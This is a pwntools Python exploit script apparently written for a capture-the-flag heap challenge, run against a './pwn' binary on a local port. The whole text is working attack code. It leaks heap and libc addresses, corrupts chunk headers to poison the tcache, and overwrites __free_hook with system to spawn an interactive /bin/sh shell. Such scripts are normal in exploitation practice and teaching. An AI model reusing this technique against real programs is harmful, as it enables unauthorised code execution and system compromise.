from pwn import *
context(os='linux', arch='amd64', log_level='debug')

procname = './pwn'
libcname = './libc.so.6'

# io = process(procname, stdin=PTY)
io = remote('localhost', 42651)
elf = ELF(procname)
libc = ELF(libcname)

n2b = lambda x    : str(x).encode()
rv  = lambda x    : io.recv(x)
ru  = lambda s    : io.recvuntil(s, drop=True)
sd  = lambda s    : io.send(s)
sl  = lambda s    : io.sendline(s)
sn  = lambda s    : sl(n2b(n))
sa  = lambda p, s : io.sendafter(p, s)
sla = lambda p, s : io.sendlineafter(p, s)
sna = lambda p, n : sla(p, n2b(n))
ia  = lambda      : io.interactive()
rop = lambda r    : flat([p64(x) for x in r])

def leakaddr(pre = None, suf = None, bit = 64, keepsuf = True, off = 0):
    u = {64: u64, 32: u32}
    num = 6 if bit == 64 else 4
    if pre is not None:
        ru(pre)
    if suf is not None:
        r = ru(suf)
        if keepsuf:
            r += suf
        r = r[-num:]
    else:
        r = rv(num)
    return u[bit](r.ljust(bit//8, b'\0')) - off

prompt      = b': '
prompt_menu = b'>>> '
prompt_idx  = prompt

op   = lambda x : sla(prompt_menu, n2b(x))
snap = lambda n : sna(prompt, n)
sidx = lambda x : sla(prompt_idx, n2b(x))
sap  = lambda s : sa(prompt, s)
slap = lambda s : sla(prompt, s)

def create(name_size, content_size, name, content):
    op(1)
    snap(name_size)
    snap(content_size)
    sap(name)
    sap(content)

def show(idx):
    op(2)
    sidx(idx)

def edit_title(idx, name):
    op(3)
    sidx(idx)
    sap(name)

def edit_content(idx, content):
    op(4)
    sidx(idx)
    sap(content)

create(0x10, 0x240, b'a' * 0x10, b'/bin/sh\0'.ljust(0x240, b'a'))
create(0x10, 0x240, b'b' * 0x10, b'b' * 0x240)
num = 4
half_block = 0x800
for i in range(num):
    create(half_block, half_block, b'a'*(half_block-1) + p8(i), b'a'*(half_block-1) + p8(i))
    sleep(0.2)
sleep(1)
create(half_block, half_block, b'a'*(half_block-1) + p8(num-1), b'a'*(half_block-1) + p8(num-1))
create(0x10, 0x10, b'1'*0x10, b'1'*0x10) # num + 2
edit_content(0, b'b' * 0x240)
show(num + 2)
bck = leakaddr(suf=b'\x7f')
heap = leakaddr(suf=b'\x55', off=0x10)
success(f'leak heap: {hex(heap)}')
payload = flat([
    b'2' * 0x20,
    rop([0, 0x21, heap + 0x4c0, heap + 0x10]),
    rop([0, 0x121]), b'\0' * 0x110,
    rop([0, 0x251, heap + 0x10, heap + 0x10]), b'c' * 0x230,
    rop([0, 0x121]), b'\0' * 0x110,
    rop([0, 0x1ace1]),
])
payload = payload.ljust(0x800, b'\0')
# pause()
sleep(1)
edit_title(num + 2, payload)
create(0x200, 0x40, b'x' * 0x200, b'2' * 0x40)
create(0x40, 0x200, (b'\0' * 0x7 + b'\x10').ljust(0x40, b'\0'), b'\0' * 0x200) # num + 4 = tcache
create(0xe00, 0x50, b's' * 0xe00, b's' * 0x50)
create(0x40, 0x40, b't' * 0x40, b't' * 0x40)
create(0x40, 0x40, b't' * 0x40, b't' * 0x40)
show(num + 2)
ru(rop([0, 0x91]))
libc.address = leakaddr(off=0x3EBCA0)
success(f'leak libc.address: {hex(libc.address)}')

edit_content(num + 4, rop([0, 0, 0, libc.sym.__free_hook]))
create(0x10, 0x30, p64(libc.sym.system), b'\0')
edit_content(1, b'/bin/sh\0'.ljust(0x240, b'a'))
edit_content(1, b'/bin/sh\0'.ljust(0x240, b'a'))
# create()

ia()
